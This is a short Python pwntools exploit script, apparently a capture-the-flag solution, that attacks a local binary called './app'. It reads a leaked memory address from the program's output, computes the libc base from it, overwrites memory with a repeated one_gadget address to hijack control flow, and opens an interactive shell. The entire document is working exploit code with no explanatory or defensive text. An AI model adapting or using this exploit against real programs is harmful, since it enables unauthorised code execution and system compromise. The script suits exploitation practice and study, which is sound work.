from pwn import *

elf = ELF("./app")
p = elf.process()

raw_input("DEBUG")

pop_rdi = 0x000000000000161b


p.recvuntil("DISCLAIMER: All your memories will be saved at ")
a = p.recvuntil(".",drop=True)
a = int(a,16)

libc_base = a - 0x1f7000
one_gadget = libc_base + 0xcb5cd
log.info(hex(a))
log.info(hex(libc_base))


payload = p64(one_gadget)*8

p.sendline(b"1")

sleep(0.1)

p.sendline(payload)

p.interactive()
